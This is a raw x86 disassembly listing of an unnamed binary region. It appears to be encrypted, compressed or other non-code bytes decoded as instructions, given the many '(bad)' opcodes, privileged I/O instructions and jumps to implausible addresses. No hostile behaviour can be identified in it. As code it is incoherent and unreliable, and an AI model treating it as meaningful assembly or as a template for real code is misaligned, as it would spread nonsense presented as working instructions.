  407ccb:	lods   al,BYTE PTR ds:[esi]
  407ccc:	sub    DWORD PTR [ecx+0x4c],edx
  407ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cd0:	push   ss
  407cd1:	sbb    al,0xdd
  407cd3:	arpl   WORD PTR [eax-0x2eb1f4ae],di
  407cd9:	fwait
  407cda:	sub    eax,DWORD PTR [edx+0x70]
  407cdd:	xor    dh,dl
  407cdf:	dec    eax
  407ce0:	sub    esp,esi
  407ce2:	fisub  DWORD PTR [edi+0x129ef312]
  407ce8:	fldenv [eax+0x174e1d10]
  407cee:	daa    
  407cef:	cmp    edi,DWORD PTR [ebx+0x79b3a39f]
  407cf5:	(bad)  
  407cf6:	mov    edi,0x2e0e4db3
  407cfb:	shr    DWORD PTR [edi],cl
  407cfd:	sub    eax,DWORD PTR [ebx]
  407cff:	sub    bh,BYTE PTR [ebp+0x5e7363ed]
  407d05:	jmp    0xa8429af7
  407d0a:	adc    eax,0x92256d70
  407d0f:	outs   dx,DWORD PTR ds:[esi]
  407d10:	pusha  
  407d11:	mov    eax,ds:0x1948222b
  407d16:	imul   ecx,DWORD PTR [edx+0x2f3c0ac1],0xffffffad
  407d1d:	push   0xa6ad46e6
  407d22:	and    cl,BYTE PTR [ebx-0x47]
  407d25:	les    ecx,FWORD PTR [ecx-0x264d7f41]
  407d2b:	(bad)  
  407d2c:	ss (bad) 
  407d2e:	popa   
  407d2f:	jns    0x407d23
  407d31:	call   0xe432:0x24cb1de4
  407d38:	(bad)  [ebx+0x1e]
  407d3b:	adc    eax,0xe44263f4
  407d40:	das    
  407d41:	adc    al,0xba
  407d43:	xor    al,BYTE PTR [ecx-0x5ab364cf]
  407d49:	inc    esp
  407d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d4b:	clc    
  407d4c:	jecxz  0x407d5f
  407d4e:	or     eax,0x4eb36be0
  407d53:	push   ebx
  407d54:	push   0xffffffb6
  407d56:	(bad)  
  407d57:	fld    TBYTE PTR [ebp+0x63]
  407d5a:	adc    ebp,edi
  407d5c:	lods   eax,DWORD PTR ds:[esi]
  407d5d:	sub    dl,bl
  407d5f:	fsub   QWORD PTR [ecx+eiz*2+0x6b6a5c45]
  407d66:	mov    bh,0x8a
  407d68:	stos   BYTE PTR es:[edi],al
  407d69:	(bad)  
  407d6a:	jne    0x407dad
  407d6c:	mov    al,0x7e
  407d6e:	arpl   di,bp
  407d70:	inc    edx
  407d71:	les    eax,FWORD PTR [eax+0x16d4116a]
  407d77:	mov    gs,eax
  407d79:	or     ebx,ebx
  407d7b:	add    DWORD PTR [esi],esi
  407d7d:	sbb    DWORD PTR [esi-0x4d4889e4],0xffffffdf
  407d84:	pop    edi
  407d85:	pop    ebx
  407d86:	cmp    eax,0x431b4d10
  407d8b:	pop    edx
  407d8c:	mov    cl,0xce
  407d8e:	xor    cl,al
  407d90:	mov    DWORD PTR [ebx+0x61],eax
  407d93:	add    ch,BYTE PTR [eax-0x163e88d7]
  407d99:	int3   
  407d9a:	sub    ebx,DWORD PTR [ebx-0x1a41782]
  407da0:	loop   0x407d8c
  407da2:	std    
  407da3:	and    ecx,ecx
  407da5:	lods   eax,DWORD PTR ds:[esi]
  407da6:	dec    esp
  407da7:	or     ebx,eax
  407da9:	jl     0x407df7
  407dab:	shr    ah,cl
  407dad:	stc    
  407dae:	xlat   BYTE PTR ds:[ebx]
  407daf:	aas    
  407db0:	fidiv  WORD PTR [edx]
  407db2:	popf   
  407db3:	xchg   DWORD PTR [edi-0x5a6637c9],edi
  407db9:	scas   al,BYTE PTR es:[edi]
  407dba:	fcom   st(2)
  407dbc:	int3   
  407dbd:	adc    BYTE PTR [ecx+0x47],al
  407dc0:	cmc    
  407dc1:	jle    0x407da3
  407dc3:	jp     0x407d52
  407dc5:	push   eax
  407dc6:	jns    0x407d66
  407dc8:	pop    esp
  407dc9:	and    dl,dh
  407dcb:	and    DWORD PTR [edi],esp
  407dcd:	cmp    edx,DWORD PTR [edx]
  407dcf:	sbb    al,0x21
  407dd1:	mov    dl,0x48
  407dd3:	jle    0x407dc3
  407dd5:	mov    ch,0x7b
  407dd7:	popa   
  407dd8:	adc    bh,BYTE PTR [ecx+0x7a1cc6a5]
  407dde:	daa    
  407ddf:	mov    al,ds:0xe735d3f3
  407de4:	(bad)  
  407de5:	fxch   st(5)
  407de7:	sbb    esi,ecx
  407de9:	or     al,0xef
  407deb:	or     ecx,0x50e1d5ea
  407df1:	lods   al,BYTE PTR ds:[esi]
  407df2:	fldenv [edi]
  407df4:	push   esp
  407df5:	in     eax,0x9e
  407df7:	and    BYTE PTR [ebx-0x1746e4d4],0x89
  407dfe:	sub    BYTE PTR [si],bh
  407e01:	daa    
  407e02:	jecxz  0x407e1b
  407e04:	mov    ch,0x5a
  407e06:	sub    DWORD PTR [ecx+0xbcec9ca],esp
  407e0c:	test   DWORD PTR ds:[edx+0x319cf6f8],ecx
  407e13:	outs   dx,DWORD PTR ds:[esi]
  407e14:	xor    ch,dl
  407e16:	sub    ebp,DWORD PTR ds:0xdd7343f3
  407e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e1d:	xchg   ebx,eax
  407e1e:	repnz icebp 
  407e20:	sub    ecx,edi
  407e22:	mov    al,0x2b
  407e24:	pushf  
  407e25:	add    al,BYTE PTR [edi+ebp*2-0x48]
  407e29:	push   esi
  407e2a:	xor    al,0x1c
  407e2c:	mov    ?,WORD PTR [edi-0x2f2b6a1b]
  407e32:	push   esi
  407e33:	push   ebp
  407e34:	push   edx
  407e35:	dec    esi
  407e36:	jns    0x407e9e
  407e38:	xchg   edx,eax
  407e39:	cld    
  407e3a:	and    dl,BYTE PTR [edx-0x6bff8c1e]
  407e40:	ret    0xf958
  407e43:	dec    ecx
  407e44:	adc    ah,al
  407e46:	lahf   
  407e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e48:	jle    0x407e94
  407e4a:	dec    ecx
  407e4b:	or     al,0x80
  407e4d:	addr16 mov ds:0x2de9,eax
  407e51:	jge    0x407e61
  407e53:	push   edx
  407e54:	adc    DWORD PTR [esi+0x40],0x6a11cd0e
  407e5b:	inc    ebx
  407e5c:	lahf   
  407e5d:	or     DWORD PTR [edi],0x65675b55
  407e63:	jmp    0x9d73:0xc64b0ae2
  407e6a:	sahf   
  407e6b:	and    BYTE PTR [ebx+0x5d],0x8
  407e6f:	jnp    0x407ea5
  407e71:	ja     0x407ed7
  407e73:	and    edx,edx
  407e75:	dec    edx
  407e76:	dec    esi
  407e77:	stos   DWORD PTR es:[edi],eax
  407e78:	test   eax,0xa65c4342
  407e7d:	clc    
  407e7e:	stos   BYTE PTR es:[edi],al
  407e7f:	shl    DWORD PTR [eax],0x79
  407e82:	pop    esi
  407e83:	mov    ah,0x26
  407e85:	ss sub eax,0x39335b20
  407e8b:	sub    al,0xa7
  407e8d:	add    DWORD PTR [ecx],edx
  407e8f:	cs xchg edx,eax
  407e91:	sbb    al,0xb6
  407e93:	fwait
  407e94:	inc    eax
  407e95:	icebp  
  407e96:	retf   0x1ceb
  407e99:	sub    bl,BYTE PTR [ecx-0x31c0b37b]
  407e9f:	fcmove st,st(5)
  407ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea2:	in     eax,0xd7
  407ea4:	push   ds
  407ea5:	test   al,0x3c
  407ea7:	int3   
  407ea8:	inc    ecx
  407ea9:	dec    ecx
  407eaa:	mov    ebx,fs
  407eac:	jecxz  0x407e35
  407eae:	push   esp
  407eaf:	xchg   edx,eax
  407eb0:	icebp  
  407eb1:	or     al,0x54
  407eb3:	hlt    
  407eb4:	cmp    eax,0xcce2f48
  407eb9:	mov    ebx,0x9284d91b
  407ebe:	nop
  407ebf:	jecxz  0x407f20
  407ec1:	mov    bh,0xe3
  407ec3:	push   ebx
  407ec4:	adc    DWORD PTR [esi],ecx
  407ec6:	pop    ebx
  407ec7:	pop    ds
  407ec8:	push   eax
  407ec9:	pop    ss
  407eca:	xchg   ecx,eax
  407ecb:	xchg   esp,eax
  407ecc:	int3   
  407ecd:	iret   
  407ece:	add    ebp,ebp
  407ed0:	pop    eax
  407ed1:	push   esp
  407ed2:	cmp    cl,BYTE PTR ds:0x13be7643
  407ed8:	test   al,0xd1
  407eda:	out    dx,al
  407edb:	gs aas 
  407edd:	pusha  
  407ede:	jae    0x407e7f
  407ee0:	cmp    BYTE PTR [esi],al
  407ee2:	ret    
  407ee3:	push   esp
  407ee4:	ja     0x407eaa
  407ee6:	xchg   ecx,eax
  407ee7:	jo     0x407f63
  407ee9:	loop   0x407f30
  407eeb:	xor    dh,0x54
  407eee:	popa   
  407eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ef1:	mov    cl,BYTE PTR [edx]
  407ef3:	xchg   ebx,eax
  407ef4:	pop    esi
  407ef5:	sar    BYTE PTR [eax],1
  407ef7:	setl   BYTE PTR [esi+0x54]
  407efb:	or     al,0x53
  407efd:	xchg   cl,ch
  407eff:	jle    0x407e90
  407f01:	les    edx,FWORD PTR [edi]
  407f03:	jb     0x407eca
  407f05:	xor    BYTE PTR [ebx-0x1b],0x8e
  407f09:	clc    
  407f0a:	addr16 mov bh,0x9c
  407f0d:	lahf   
  407f0e:	loopne 0x407ecb
  407f10:	pop    ds
  407f11:	stos   DWORD PTR es:[edi],eax
  407f12:	push   eax
  407f13:	outs   dx,BYTE PTR ds:[esi]
  407f14:	test   bl,0x93
  407f17:	push   ebx
  407f18:	ins    BYTE PTR es:[edi],dx
  407f19:	xor    edi,esi
  407f1b:	and    BYTE PTR [ecx-0x14],dh
  407f1e:	mov    bh,BYTE PTR [ebp+0x5a]
  407f21:	or     BYTE PTR [esp+ebp*4+0x7a],0xf5
  407f26:	push   edi
  407f27:	xlat   BYTE PTR ds:[ebx]
  407f28:	mul    DWORD PTR [esi-0xfc0d0fc]
  407f2e:	pop    esp
  407f2f:	pop    esp
  407f30:	(bad)  
  407f31:	jno    0x407edc
  407f33:	data16 add al,BYTE PTR [esi]
  407f36:	push   0xd15b05c5
  407f3b:	push   0xebe11974
  407f40:	jg     0x407ef0
  407f42:	hlt    
  407f43:	les    edx,FWORD PTR [eax+0x2c923829]
  407f49:	fcomp  QWORD PTR [eax]
  407f4b:	stc    
  407f4c:	aas    
  407f4d:	pop    ss
  407f4e:	(bad)  
  407f4f:	aas    
  407f50:	outs   dx,BYTE PTR ds:[si]
  407f52:	in     eax,0xcc
  407f54:	ret    0x8def
  407f57:	cdq    
  407f58:	dec    eax
  407f59:	xchg   edx,eax
  407f5a:	jne    0x407eeb
  407f5c:	nop
  407f5d:	or     ch,BYTE PTR [edx-0x3f44bbbf]
  407f63:	test   al,0xc6
  407f65:	es push cs
  407f67:	lds    eax,FWORD PTR [ebx-0x57]
  407f6a:	cmc    
  407f6b:	sti    
  407f6c:	adc    dh,BYTE PTR [esi]
  407f6e:	pop    esi
  407f6f:	cmp    DWORD PTR [esi+ebp*8-0x8],esp
  407f73:	and    al,0xfb
  407f75:	add    eax,0xfd84a32d
  407f7a:	(bad)  
  407f7b:	out    0x95,eax
  407f7d:	inc    ebx
  407f7e:	inc    edi
  407f7f:	xchg   ebp,eax
  407f80:	retf   
  407f81:	rcl    BYTE PTR [ebp+0x28],0xe9
  407f85:	or     ch,BYTE PTR [ecx-0x21fa857a]
  407f8b:	jae    0x407f74
  407f8d:	sub    dh,BYTE PTR [edx]
  407f8f:	pop    esp
  407f90:	stos   DWORD PTR es:[edi],eax
  407f91:	lds    edi,FWORD PTR ds:0x28a92081
  407f97:	clc    
  407f98:	push   esp
  407f99:	out    dx,al
  407f9a:	int    0x66
  407f9c:	test   ch,dh
  407f9e:	in     al,dx
  407f9f:	scas   al,BYTE PTR es:[edi]
  407fa0:	dec    esp
  407fa1:	and    esp,DWORD PTR [edx+eax*4]
  407fa4:	in     eax,0x5
  407fa6:	(bad)  
  407fa7:	jp     0x407ff9
  407fa9:	inc    eax
  407faa:	call   0x30:0xaaf32698
  407fb1:	sbb    ebx,ecx
  407fb3:	(bad)  
  407fb4:	loope  0x407fc9
  407fb6:	mov    al,BYTE PTR [edx-0x528cc10d]
  407fbc:	cli    
  407fbd:	sub    al,0x3d
  407fbf:	pop    ss
  407fc0:	inc    esi
  407fc1:	jns    0x407f9e
  407fc3:	mov    eax,ds:0xbb352592
  407fc8:	shl    BYTE PTR [edx],0x84
  407fcb:	dec    edi
  407fcc:	and    dh,BYTE PTR cs:[ebp+0x3a]
  407fd0:	test   eax,0xfe5ef9d3
  407fd5:	(bad)  
  407fd6:	cmp    ebx,DWORD PTR ds:0x7a80d899
  407fdc:	jo     0x407fe6
  407fde:	inc    eax
  407fdf:	dec    eax
  407fe0:	xor    eax,0xb4a62c65
  407fe5:	int3   
  407fe6:	or     BYTE PTR [esi],0x9
  407fe9:	mov    al,ds:0x91ca8bd5
  407fee:	ret    0x91a8
  407ff1:	repnz adc DWORD PTR [esi+0x62464f4e],0x20
  407ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ffa:	jnp    0x407fe1
  407ffc:	sub    al,0xfc
  407ffe:	ja     0x408068
  408000:	mov    esp,0xf367e298
  408005:	mov    cl,0x51
  408007:	sub    eax,0xc6d0df2b
  40800c:	or     ebp,edi
  40800e:	cs neg ah
  408011:	mov    ds:0x8d9dbe54,al
  408016:	or     BYTE PTR [ecx+0x25bca982],0x2c
  40801d:	or     dl,ch
  40801f:	retw   
  408021:	(bad)  
  408022:	fsub   st,st(1)
  408024:	ins    BYTE PTR es:[edi],dx
  408025:	jns    0x408074
  408027:	push   edx
  408028:	xchg   DWORD PTR [ebp-0x59f55349],eax
  40802e:	scas   eax,DWORD PTR es:[edi]
  40802f:	and    edi,eax
  408031:	or     BYTE PTR [ecx+0x73],bl
  408034:	xchg   esp,eax
  408035:	push   ss
  408036:	xchg   edx,eax
  408037:	mov    fs,WORD PTR [ebp+0x4ae7c3f2]
  40803d:	xchg   edx,eax
  40803e:	fwait
  40803f:	cmp    BYTE PTR [edx-0xb],al
  408042:	aam    0x3f
  408044:	(bad)  
  408045:	sbb    dh,BYTE PTR [edx-0x24]
  408048:	sbb    edi,esi
  40804a:	pop    es
  40804b:	(bad)  [ebx]
  40804d:	and    ecx,DWORD PTR [edx]
  40804f:	mov    esp,0x9b9ebed3
  408054:	adc    edx,esi
  408056:	test   dl,0xf
  408059:	imul   eax,eax,0x6fe6596c
  40805f:	mov    bh,BYTE PTR [edx]
  408061:	sar    cl,1
  408063:	test   eax,0x6acc5a00
  408068:	and    eax,DWORD PTR [esi-0x1159b540]
  40806e:	add    al,0xd5
  408070:	and    eax,0xcc2d5b67
  408075:	sbb    ah,BYTE PTR [eax]
  408077:	or     BYTE PTR [ebp+0x5e],dl
  40807a:	mov    dl,0x6b
  40807c:	icebp  
  40807d:	ret    0x6517
  408080:	icebp  
  408081:	pop    es
  408082:	or     edx,esp
  408084:	mov    ebx,ss
  408086:	dec    ebx
  408087:	mov    bh,0x97
  408089:	dec    ebp
  40808a:	scas   eax,DWORD PTR es:[edi]
  40808b:	and    DWORD PTR [ebx-0x76],ebp
  40808e:	dec    edx
  40808f:	ret    0xf0de
  408092:	mov    edi,0xa4a79822
  408097:	in     al,dx
  408098:	fstp   DWORD PTR [edi+0x1440106d]
  40809e:	sbb    al,0x3e
  4080a0:	pop    esp
  4080a1:	mov    edx,0x80098632
  4080a6:	in     eax,dx
  4080a7:	xchg   ebx,eax
  4080a8:	xlat   BYTE PTR ds:[ebx]
  4080a9:	lds    edi,FWORD PTR [ebx+0x5aeaea1f]
  4080af:	push   eax
  4080b0:	ret    
  4080b1:	sbb    ebx,DWORD PTR [ebp+0x33]
  4080b4:	scas   eax,DWORD PTR es:[edi]
  4080b5:	outs   dx,BYTE PTR ds:[esi]
  4080b6:	inc    edi
  4080b7:	lods   eax,DWORD PTR ds:[esi]
  4080b8:	jae    0x408132
  4080ba:	shr    ebp,cl
  4080bc:	pushf  
  4080bd:	adc    esi,DWORD PTR [ebp+0x65]
  4080c0:	lods   al,BYTE PTR ds:[esi]
  4080c1:	or     bh,BYTE PTR [edi]
  4080c3:	jns    0x40810b
  4080c5:	fsubr  QWORD PTR [ecx-0x26]
  4080c8:	dec    ebx
  4080c9:	jbe    0x4080fe
  4080cb:	and    eax,0x4f361992
  4080d0:	fwait
  4080d1:	inc    ebp
  4080d2:	(bad)  
  4080d3:	rcr    BYTE PTR [ebx-0x300824a3],0xd9
  4080da:	sub    ah,bh
  4080dc:	jp     0x40806e
  4080de:	lods   al,BYTE PTR ds:[esi]
  4080df:	stc    
  4080e0:	adc    bl,bl
  4080e2:	pop    esp
  4080e3:	push   esi
  4080e4:	stc    
  4080e5:	shl    BYTE PTR [ecx],0x46
  4080e8:	mov    ecx,0xa2ff0960
  4080ed:	add    dh,dl
  4080ef:	add    al,0x17
  4080f1:	push   ebp
  4080f2:	lock xlat BYTE PTR ds:[ebx]
  4080f4:	(bad)  [esi-0x327f1c38]
  4080fa:	dec    eax
  4080fb:	shl    DWORD PTR [esi],1
  4080fd:	pop    eax
  4080fe:	add    BYTE PTR [edx-0x4e],bh
  408101:	sub    al,0x66
  408103:	jmp    0x8f0720d
  408108:	cmp    dl,BYTE PTR [edi+0x7343d4a3]
  40810e:	pop    ebp
  40810f:	call   DWORD PTR [ebx]
  408111:	adc    eax,0xfc40c0e6
  408116:	mov    bl,0x8
  408118:	push   0x9
  40811a:	xchg   esp,eax
  40811b:	and    edx,edi
  40811d:	push   esi
  40811e:	jnp    0x408117
  408120:	mov    edx,0x436821bd
  408125:	sbb    esi,esi
  408127:	das    
  408128:	adc    bh,BYTE PTR [ebx+0x71bbd5f1]
  40812e:	stc    
  40812f:	adc    al,0x41
  408131:	add    BYTE PTR [esi+0x67],al
  408134:	imul   edi,DWORD PTR [edx+eiz*1+0x51e51e4],0x8161c7a4
  40813f:	cwde   
  408140:	pop    ebp
  408141:	pusha  
  408142:	jns    0x408119
  408144:	sbb    DWORD PTR [ecx],ebp
  408146:	lds    ebp,FWORD PTR ds:0xfb9da50
  40814c:	or     bl,ch
  40814e:	push   esi
  40814f:	outs   dx,BYTE PTR ds:[esi]
  408150:	ficom  DWORD PTR [edi+0x7625260a]
  408156:	retf   0x2e48
  408159:	inc    edi
  40815a:	mov    ah,0xab
  40815c:	jnp    0x408122
  40815e:	add    DWORD PTR [eax-0x76],ebp
  408161:	dec    ecx
  408162:	fcmovne st,st(6)
  408164:	outs   dx,BYTE PTR ds:[esi]
  408165:	nop
  408166:	xor    al,0x1b
  408168:	data16 sar ch,1
  40816b:	mov    eax,0x84f2162a
  408170:	pop    ebp
  408171:	loope  0x40811f
  408173:	imul   edx,DWORD PTR [esi+0x4f],0x4d
  408177:	pop    esp
  408178:	pop    edi
  408179:	pop    ebp
  40817a:	sbb    al,0xe1
  40817c:	sbb    al,0x63
  40817e:	dec    edx
  40817f:	inc    ebx
  408180:	rcl    DWORD PTR [ebx+0x7d],cl
  408183:	out    dx,eax
  408184:	sbb    eax,0xbc69d356
  408189:	mov    cl,0x33
  40818b:	nop
  40818c:	jmp    DWORD PTR [ebx+0x2240e39e]
  408192:	inc    esi
  408193:	dec    eax
  408194:	push   ds
  408195:	mov    ebx,0x8ac031d9
  40819a:	int    0x12
  40819c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40819d:	pop    ebp
  40819e:	cmp    eax,0xc5c785f0
  4081a3:	xor    ebx,DWORD PTR [edi+0x18]
  4081a6:	mov    ds:0xbbed8796,al
  4081ab:	int    0xe1
  4081ad:	cmp    eax,0x5796df37
  4081b2:	fcomp  QWORD PTR [edi]
  4081b4:	push   ss
  4081b5:	mov    eax,ds:0xdd06a328
  4081ba:	inc    esp
  4081bb:	inc    edi
  4081bc:	push   es
  4081bd:	push   0xe04e7bd6
  4081c2:	sar    ebp,1
  4081c4:	ja     0x408210
  4081c6:	stos   DWORD PTR es:[edi],eax
  4081c7:	add    eax,0xd884e979
  4081cc:	aam    0x5d
  4081ce:	dec    ebp
  4081cf:	xchg   DWORD PTR [edi],ecx
  4081d1:	sbb    BYTE PTR [ecx],ah
  4081d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081d4:	fnstenv [esi+0x1a]
  4081d7:	sbb    al,0xc3
  4081d9:	bound  esi,QWORD PTR [ebx-0x59]
  4081dc:	ins    BYTE PTR es:[edi],dx
  4081dd:	hlt    
  4081de:	or     DWORD PTR [ebx],esp
  4081e0:	mov    DWORD PTR cs:[ebx-0x144b6da4],0x282ed8c4
  4081eb:	and    ecx,DWORD PTR ds:0x4766e1b1
  4081f1:	cmp    eax,0x2e15b167
  4081f6:	inc    edi
  4081f7:	fsubr  DWORD PTR [esi]
  4081f9:	or     DWORD PTR [edx-0x4c78ebfb],esp
  4081ff:	mov    esp,0xfe68a466
  408204:	stc    
  408205:	and    BYTE PTR [ecx+0x70a2dc24],dh
  40820b:	addr16 into 
  40820d:	cvtps2pi mm5,QWORD PTR [eax]
  408210:	mov    ecx,0x1f4e2a04
  408215:	rcl    dh,1
  408217:	call   DWORD PTR [eax]
  408219:	push   esi
  40821a:	aad    0xbc
  40821c:	sub    BYTE PTR [ecx],dl
  40821e:	mov    esi,DWORD PTR [eax-0x53645334]
  408224:	aad    0xa3
  408226:	ret    
  408227:	fsubr  st(6),st
  408229:	pop    ebx
  40822a:	and    al,0xf5
  40822c:	ds pop esp
  40822e:	fldcw  WORD PTR [edi-0x133a706a]
  408234:	fs xchg ebp,eax
  408236:	in     eax,0xf5
  408238:	push   ds
  408239:	xor    al,0xa2
  40823b:	inc    eax
  40823c:	push   esp
  40823d:	push   esp
  40823e:	jno    0x4081e7
  408240:	sub    dh,BYTE PTR [ebp-0x37]
  408243:	sub    DWORD PTR [ebp-0x708afbd3],ecx
  408249:	jbe    0x408238
  40824b:	in     al,dx
  40824c:	cmp    DWORD PTR [ebx-0x57205dbf],edi
  408252:	test   eax,0x475f8653
  408257:	loopne 0x408208
  408259:	xor    edi,DWORD PTR [eax]
  40825b:	fidiv  DWORD PTR [ebx-0x33ff1ee1]
  408261:	add    eax,esi
  408263:	std    
  408264:	inc    esi
  408265:	inc    BYTE PTR [ecx]
  408267:	out    0x88,al
  408269:	nop
  40826a:	mov    WORD PTR [edx],ss
  40826c:	stos   DWORD PTR es:[edi],eax
  40826d:	scas   al,BYTE PTR es:[edi]
  40826e:	dec    ebx
  40826f:	xchg   esi,eax
  408270:	pop    ecx
  408271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408272:	stos   BYTE PTR es:[edi],al
  408273:	ja     0x4082c0
  408275:	mov    ch,0xf5
  408277:	push   ss
  408278:	sar    BYTE PTR [ebp+0x716ab359],1
  40827e:	mov    WORD PTR [ebp+0x39],es
  408281:	cs push ds
  408283:	xchg   esp,eax
  408284:	inc    ecx
  408285:	int    0x25
  408287:	lea    eax,[edi+0x7a333559]
  40828d:	push   ss
  40828e:	test   BYTE PTR [esi+0xddbe5a8],dl
  408294:	fild   DWORD PTR [edi+0x1d]
  408297:	push   es
  408298:	stc    
  408299:	pop    ss
  40829a:	ret    0xa8d5
  40829d:	jo     0x408281
  40829f:	cld    
  4082a0:	cli    
  4082a1:	loopne 0x40826f
  4082a3:	repnz xor dl,ch
  4082a6:	in     al,dx
  4082a7:	mov    edx,0xb1ef4b48
  4082ac:	jl     0x4082c7
  4082ae:	and    eax,0xdac2e63a
  4082b3:	sub    BYTE PTR [edi-0x52],0x41
  4082b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082b8:	std    
  4082b9:	mov    ch,0x25
  4082bb:	xor    al,0xc6
  4082bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082be:	std    
  4082bf:	xchg   esp,eax
  4082c0:	lds    ecx,FWORD PTR [ebp+0x64]
  4082c3:	or     al,0x19
  4082c5:	scas   eax,DWORD PTR es:[edi]
  4082c6:	fsub   st(6),st
  4082c8:	loop   0x4082bf
  4082ca:	dec    edi
  4082cb:	test   BYTE PTR [edx-0x24abf71b],dl
  4082d1:	pop    esp
  4082d2:	xor    BYTE PTR [eax],ah
  4082d4:	mov    DWORD PTR [ebx+0x0],0x63e39200
  4082db:	mov    esi,0x78a9d6d4
  4082e0:	push   ebp
  4082e1:	and    eax,0xff435995
  4082e6:	sbb    eax,0x476bd95d
  4082eb:	dec    edi
  4082ec:	jo     0x408296
  4082ee:	lods   eax,DWORD PTR ds:[esi]
  4082ef:	sub    ebp,DWORD PTR [ecx-0x227b3fda]
  4082f5:	mov    dh,0xb0
  4082f7:	cmp    eax,0x693d2e3
  4082fc:	sbb    eax,0xbe8ed15f
  408301:	in     al,0xbe
  408303:	(bad)  
  408304:	loop   0x40830a
  408306:	mov    ds:0xa105d131,al
  40830b:	aad    0x5f
  40830d:	das    
  40830e:	aas    
  40830f:	or     al,BYTE PTR [ecx-0x7cdf842b]
  408315:	mov    al,ds:0x8fcc8697
  40831a:	mov    BYTE PTR [ecx+0x45],ch
  40831d:	hlt    
  40831e:	icebp  
  40831f:	xor    ah,bh
  408321:	adc    eax,0xf820b1d8
  408326:	xlat   BYTE PTR ds:[ebx]
  408327:	and    DWORD PTR [edi],edi
  408329:	stc    
  40832a:	jmp    0x41d074dc
  40832f:	cmc    
  408330:	pop    edi
  408331:	lods   eax,DWORD PTR ds:[esi]
  408332:	adc    ecx,0xffffff8f
  408335:	ins    BYTE PTR es:[edi],dx
  408336:	pushf  
  408337:	stc    
  408338:	jnp    0x40836c
  40833a:	aam    0x11
  40833c:	push   ds
  40833d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40833e:	mov    eax,ds:0x5e5f0c46
  408343:	test   eax,0xb801e92d
  408348:	fdivrp st(3),st
  40834a:	mov    BYTE PTR [ecx+ebp*1+0x54],bl
  40834e:	inc    ecx
  40834f:	cmp    DWORD PTR [edx],0xffffffa8
  408352:	mov    bl,0xa3
  408354:	xor    eax,ebx
  408356:	pop    ebp
  408357:	leave  
  408358:	outs   dx,BYTE PTR ds:[esi]
  408359:	or     al,0x4d
  40835b:	ins    BYTE PTR es:[edi],dx
  40835c:	sub    BYTE PTR [ecx+0xeb2c0d5],dl
  408362:	push   ss
  408363:	pop    edi
  408364:	xor    DWORD PTR [eax+0x31],edi
  408367:	jp     0x408305
  408369:	and    eax,0xc06ef138
  40836e:	mov    ds:0x57c4dc3d,al
  408373:	leave  
  408374:	stos   DWORD PTR es:[edi],eax
  408375:	repz ret 0x2874
  408379:	push   ebp
  40837a:	sbb    BYTE PTR [edx+0x79fb81c8],al
  408380:	cmp    BYTE PTR [eax],ah
  408382:	fld    TBYTE PTR [edx+0x1d]
  408385:	lods   eax,DWORD PTR ds:[esi]
  408386:	mov    esp,0x1757e042
  40838b:	pop    eax
  40838c:	outs   dx,DWORD PTR ds:[esi]
  40838d:	rol    DWORD PTR [esp+edi*1-0x65],1
  408391:	xchg   ecx,eax
  408392:	outs   dx,BYTE PTR ds:[esi]
  408393:	dec    ecx
  408394:	mov    ds,WORD PTR [ebp+ebx*2-0x2b]
  408398:	mov    ebx,0xd54a68eb
  40839d:	cmc    
  40839e:	xor    BYTE PTR [ebx-0x3f466869],ah
  4083a4:	clc    
  4083a5:	scas   eax,DWORD PTR es:[edi]
  4083a6:	dec    ebx
  4083a7:	(bad)  
  4083a8:	in     al,0xc8
  4083aa:	mov    dh,0x45
  4083ac:	sbb    edx,DWORD PTR [esi+0x1784aaa3]
  4083b2:	dec    ecx
  4083b3:	bound  ecx,QWORD PTR [eax]
  4083b5:	xor    al,0x9c
  4083b7:	div    cl
  4083b9:	out    dx,eax
  4083ba:	mul    dl
  4083bc:	neg    DWORD PTR [eax]
  4083be:	inc    eax
  4083bf:	fisttp DWORD PTR ds:0x48443cd
  4083c5:	ret    0xeefd
  4083c8:	cmp    cl,BYTE PTR [bx+di]
  4083cb:	mov    bh,0x36
  4083cd:	cmp    BYTE PTR [edi+0x6e5896a4],bh
  4083d3:	mov    BYTE PTR [edx+0x12a3eaf0],bh
  4083d9:	mov    edx,0x294d3a8e
  4083de:	dec    esi
  4083df:	cld    
  4083e0:	pusha  
  4083e1:	or     DWORD PTR [ebx+eiz*4-0x6307f668],eax
  4083e8:	fcompp 
  4083ea:	adc    BYTE PTR [ecx-0x49],ch
  4083ed:	pop    ecx
  4083ee:	dec    edx
  4083ef:	xor    bh,BYTE PTR [ecx]
  4083f1:	cli    
  4083f2:	fbld   TBYTE PTR [ebx-0x20c6093d]
  4083f8:	xchg   DWORD PTR [ebp+0x556c2a6],esp
  4083fe:	inc    eax
  4083ff:	rol    DWORD PTR [edi],cl
  408401:	sbb    al,0x2
  408403:	ror    DWORD PTR [ebx-0xff2730d],0xbf
  40840a:	call   0xceccdef2
  40840f:	xchg   edi,eax
  408410:	dec    eax
  408411:	nop
  408412:	ja     0x4083a2
  408414:	loope  0x40839d
  408416:	xchg   edi,eax
  408417:	xor    edi,DWORD PTR [edx-0x74681795]
  40841d:	test   DWORD PTR [ebp-0xfee632c],edx
  408423:	add    eax,0xdc71999
  408428:	lods   ax,WORD PTR ds:[si]
  40842b:	inc    esp
  40842c:	arpl   WORD PTR [ebp-0x30],sp
  40842f:	repz sub bl,al
  408432:	sub    DWORD PTR [ebx-0xb],esi
  408435:	cdq    
  408436:	sbb    al,0x10
  408438:	add    DWORD PTR [ebp-0x24d61272],ebx
  40843e:	mov    cl,0x26
  408440:	retf   
  408441:	enter  0xe709,0xd0
  408445:	aas    
  408446:	test   DWORD PTR [eax-0x522ec850],eax
  40844c:	push   ebp
  40844d:	adc    eax,0xd5b4e1a0
